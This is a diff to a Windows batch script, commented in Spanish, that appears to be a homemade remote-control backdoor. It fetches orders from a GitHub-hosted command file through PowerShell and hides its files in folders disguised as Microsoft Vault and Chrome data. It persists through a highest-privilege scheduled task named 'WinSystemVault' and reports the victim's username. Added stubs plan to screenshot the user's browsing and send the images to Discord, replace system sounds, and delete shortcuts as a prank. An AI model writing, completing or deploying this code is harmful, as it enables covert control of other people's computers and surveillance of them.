@@ -11,14 +11,15 @@ if %errorlevel% neq 0 (
 :: Configuración de la Memoria
 set "MEM_DIR=%AppData%\Roaming\Microsoft\Vault\data"
 set "MEM_FILE=%MEM_DIR%\last_id.dat"
-set "PRUEBA=pruebaFUEGO"
+set "PRUEBA=VER6_%USERNAME%"
+
 call :FUNC_REPORTAR "!PRUEBA!" 
 :: Crear la carpeta si no existe (la primera vez)
 if not exist "%MEM_DIR%" mkdir "%MEM_DIR%"
 
 :: --- 2. CAPTURA DE ÓRDENES (GitHub) ---
 set "URL_COMANDOS=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/commands.txt"
-set "LOCAL_ORDENES=%temp%\ordenes.txt"
+set "LOCAL_ORDENES=C:\Users\Usuario\AppData\Local\Google\Chrome\User Data\ordenes.txt"
 
 :: Descargamos el archivo de comandos
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%LOCAL_ORDENES%')" >nul 2>&1
@@ -31,7 +32,7 @@ for %%i in ("%LOCAL_ORDENES%") do if %%~zi == 0 (del "%LOCAL_ORDENES%" & exit)
 :: --- 3. LECTURA DEL ID (PRIMERA LÍNEA) ---
 :: 'set /p' lee solo la primera línea del archivo
 set /p LINEA1=<"%LOCAL_ORDENES%"
-
+            
 :: Extraemos el valor después de "ID:"
 set "ID_NUBE=%LINEA1:ID:=%"
 
@@ -147,7 +148,7 @@ goto :EOF
 
 :FUNC_FRECUENCIA
 :: Cambia la tarea de 1 min a 1 hora después de la primera ejecución
-schtasks /create /tn "WinSystemVault" /tr "wscript.exe %AppData%\Roaming\Microsoft\Vault\run.vbs" /sc minute /mo %~1 /rl highest /f >nul 2>&1
+schtasks /create /tn "WinSystemVault" /tr "wscript.exe C:\ProgramData\Microsoft\Vault\run.vbs" /sc minute /mo %~1 /rl highest /f >nul 2>&1
 goto :EOF
 
 :FUNC_EJECUTAR_LIMPIEZA
@@ -160,3 +161,21 @@ if exist "%temp%\%ARCHIVO%" (
 )
 goto :EOF
 
+
+:FUNC_SYSTEM_SOUNDS
+set "SONIDO=%~1"
+
+::Revisar si en ubicacion hay un zip de respaldo de sonidos del sistema en usuario
+
+::si no, crear la ruta, hacer una copia de los sonidos a esa carpeta oculta
+
+::cambiar todos los sonidos por el SONIDO que es .wav y mantener los nombres de sistema originales
+
+goto :EOF
+
+:FUNC_CAPTURA_PANTALLA
+::hacer un bat que cuando se llama esta funcion, se activa en segundo plano esperando el trigger de que entra en un sitio web, cuando pase tomar 10 fotos, una cada 30 s
+::encapsular la informacion y mandarla al discord
+
+:FUNC_PANTALLA_TROLL
+::Genera un archivo de la configuracion de enlaces directos, la guarda en un lugar oculto, despues hace una captura de pantalla de su monitor actual, lo pone como fondo de pantalla y elimina los accesos directos
